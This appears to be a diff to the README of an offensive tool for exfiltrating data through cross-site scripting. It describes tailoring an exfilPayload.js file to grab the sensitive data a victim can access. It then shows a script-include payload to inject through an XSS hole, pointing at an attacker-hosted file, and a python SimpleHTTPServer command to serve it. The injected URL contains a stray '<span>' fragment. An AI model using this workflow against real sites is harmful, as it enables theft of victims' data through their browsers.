@@ -6,7 +6,7 @@ Will link to blog post once it's posted.
 Basically you tailor the exfilPayload.js file to grab the sensitive data your victim has access to. 
 
 Then in you pull that JavaScript file into the browswer by doing a script include in the XSS vulnerability:
-<script src=></script>
+<script src="ht<span>tp://127.0.0.1/exfilPayload.js"></script>
 
 Start up a python HTTP server in the directory whwere exfilPayload.js is:
 python -m SimpleHTTPServer 80
